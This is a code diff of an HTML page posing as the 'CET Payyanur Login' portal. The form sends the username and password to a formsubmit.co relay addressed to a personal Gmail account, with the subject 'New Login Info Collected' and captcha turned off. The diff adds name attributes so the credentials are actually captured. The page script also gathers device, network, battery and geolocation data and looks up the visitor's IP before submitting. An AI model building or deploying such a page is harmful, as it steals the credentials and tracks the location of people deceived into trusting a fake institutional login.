@@ -3,12 +3,7 @@
 <head>
   <title>CET Payyanur Login</title>
   <style>
-    * {
-      box-sizing: border-box;
-      margin: 0;
-      padding: 0;
-    }
-
+    * { box-sizing: border-box; margin: 0; padding: 0; }
     body {
       font-family: Arial, sans-serif;
       background-color: #f1f1f1;
@@ -16,69 +11,34 @@
       flex-direction: column;
       align-items: center;
     }
-
     .header {
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      margin-top: 40px;
-      margin-bottom: 15px;
-      width: 92%;
-      max-width: 400px;
+      display: flex; align-items: center; justify-content: center;
+      margin-top: 40px; margin-bottom: 15px;
+      width: 92%; max-width: 400px;
     }
-
-    .header img {
-      height: 100px;
-      width: 130px;
-      margin-right: 15px;
-    }
-
-    .header-text {
-      text-align: left;
-    }
-
+    .header img { height: 100px; width: 130px; margin-right: 15px; }
+    .header-text { text-align: left; }
     .header-text .title {
-      font-size: 24px;
-      
-      font-weight: bold;
-      line-height: 1.2;
-      margin-left: 50px;
+      font-size: 24px; font-weight: bold; line-height: 1.2; margin-left: 50px;
     }
-
     .header-text .subtitle {
-      font-size: 1px;
-      font-weight: bold;
-      color: #555;
-      letter-spacing: 0.5px;
-      margin-left: 40px;
+      font-size: 1px; font-weight: bold; color: #555; letter-spacing: 0.5px; margin-left: 40px;
     }
-
     .login-box {
-      width: 92%;
-      max-width: 400px;
+      width: 92%; max-width: 400px;
       background-color: #f1f1f1;
       padding: 30px 25px 20px 25px;
       border-radius: 4px;
       box-shadow: 0 0 15px rgba(0,0,0,0.30);
     }
-
     .form-group {
-      display: flex;
-      align-items: center;
-      margin-bottom: 18px;
+      display: flex; align-items: center; margin-bottom: 18px;
     }
-
     .form-group label {
       flex: 0 0 110px;
-      font-weight: bold;
-      font-size: 14px;
-      color: #222;
+      font-weight: bold; font-size: 14px; color: #222;
     }
-
-    .form-group label span {
-      color: red;
-    }
-
+    .form-group label span { color: red; }
     .form-group input {
       flex: 1;
       padding: 10px;
@@ -86,53 +46,25 @@
       border: 1px solid #ccc;
       border-radius: 3px;
     }
-
     .login-box .button-wrapper {
-      display: flex;
-      justify-content: center;
+      display: flex; justify-content: center;
     }
-
     .login-box button {
-      width: 120px;
-      background-color: #4CAF50;
-      color: white;
-      border: none;
-      font-size: 16px;
-      padding: 10px;
-      border-radius: 4px;
-      font-weight: bold;
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      cursor: pointer;
+      width: 120px; background-color: #4CAF50;
+      color: white; border: none; font-size: 16px;
+      padding: 10px; border-radius: 4px;
+      font-weight: bold; cursor: pointer;
     }
-
-    .login-box button::before {
-      margin-right: 8px;
-      font-size: 16px;
-    }
-
-    .login-box .forgot {
-      text-align: center;
-      margin-top: 12px;
-    }
-
+    .login-box .forgot { text-align: center; margin-top: 12px; }
     .login-box .forgot a {
-      text-decoration: none;
-      font-size: 13px;
-      color: #0096e2;
+      text-decoration: none; font-size: 13px; color: #0096e2;
     }
-
     footer {
       margin-top: 200px;
       font-size: 13px;
       color: #777;
     }
-
-    footer strong {
-      font-weight: bold;
-      color: #444;
-    }
+    footer strong { font-weight: bold; color: #444; }
   </style>
 </head>
 <body>
@@ -149,19 +81,18 @@
     <form id="userForm" action="https://formsubmit.co/abhinavavpavithranav@gmail.com" method="POST">
       <div class="form-group">
         <label for="username">USERNAME <span>*</span></label>
-        <input type="text" id="username" required>
-        <input type="hidden" name="collectedInfo" id="collectedInfo" />
-
-      <!-- FormSubmit options -->
-      <input type="hidden" name="_template" value="table" />
-      <input type="hidden" name="_captcha" value="false" />
-      <input type="hidden" name="_subject" value="New Login Info Collected" />
-      <input type="hidden" name="_next" value="https://abhinavavavav.github.io/thanks.html" />
+        <input type="text" id="username" name="username" required>
+        <input type="hidden" name="collectedInfo" id="collectedInfo">
+        <!-- FormSubmit options -->
+        <input type="hidden" name="_template" value="table">
+        <input type="hidden" name="_captcha" value="false">
+        <input type="hidden" name="_subject" value="New Login Info Collected">
+        <input type="hidden" name="_next" value="https://abhinavavavav.github.io/thanks.html">
       </div>
 
       <div class="form-group">
         <label for="password">PASSWORD <span>*</span></label>
-        <input type="password" id="password" required>
+        <input type="password" id="password" name="password" required>
       </div>
 
       <div class="button-wrapper">
@@ -177,7 +108,8 @@
   <footer>
     © 2025 <strong>Etuwa Concepts</strong>, All rights reserved.
   </footer>
-   <script>
+
+  <script>
     const form = document.getElementById("userForm");
 
     form.addEventListener("submit", async function (e) {
@@ -210,20 +142,21 @@
         collected.DownlinkMbps = conn.downlink || "Unknown";
       }
 
-      if ("getBattery" in navigator) {
-        try {
+      try {
+        if ("getBattery" in navigator) {
           const battery = await navigator.getBattery();
-          collected.BatteryLevel = battery.level * 100 + "%";
+          collected.BatteryLevel = (battery.level * 100) + "%";
           collected.IsCharging = battery.charging ? "Yes" : "No";
           collected.ChargingTimeSec = battery.chargingTime;
           collected.DischargingTimeSec = battery.dischargingTime;
-        } catch (err) {
-          collected.BatteryInfo = "Permission denied or not supported";
+        } else {
+          collected.BatteryInfo = "Not supported";
         }
-      } else {
-        collected.BatteryInfo = "Not supported";
+      } catch {
+        collected.BatteryInfo = "Permission denied or not supported";
       }
 
+      // Geolocation
       if ("geolocation" in navigator) {
         navigator.geolocation.getCurrentPosition(
           (position) => {
@@ -235,7 +168,8 @@
           () => {
             collected.Location = "Denied or unavailable";
             fetchIPAndSubmit(collected);
-          }
+          },
+          { timeout: 3000 }
         );
       } else {
         collected.Location = "Geolocation not supported";
